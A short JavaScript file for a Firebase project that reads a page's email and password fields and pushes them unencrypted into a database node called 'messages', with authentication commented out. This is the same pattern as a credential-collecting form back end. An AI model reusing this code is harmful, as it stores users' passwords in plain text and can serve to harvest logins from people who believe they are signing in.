
const firebaseConfig = {
  apiKey: "AIzaSyB0lug7ZYe4a1AwS02NMeUMly1XoYDRi1w",
  authDomain: "humidity-a833b.firebaseapp.com",
  databaseURL: "https://humidity-a833b-default-rtdb.firebaseio.com",
  projectId: "humidity-a833b",
  storageBucket: "humidity-a833b.appspot.com",
  messagingSenderId: "735893426058",
  appId: "1:735893426058:web:191eef06187aaba05b8273"

};
 firebase.initializeApp(firebaseConfig);
// const auth = firebase.auth();
 const database = firebase.database();

function sendData() {
      const dataToSend = {
        email: document.getElementById('email').value,
        password: document.getElementById('password').value,
        // message: document.getElementById('message').value
      };


      database.ref('messages').push(dataToSend);

     // Clear input fields after sending data
     document.getElementById('email').value = '';
     document.getElementById('password').value = '';
     // document.getElementById('message').value = '';

     alert('Data sent successfully!');
   }
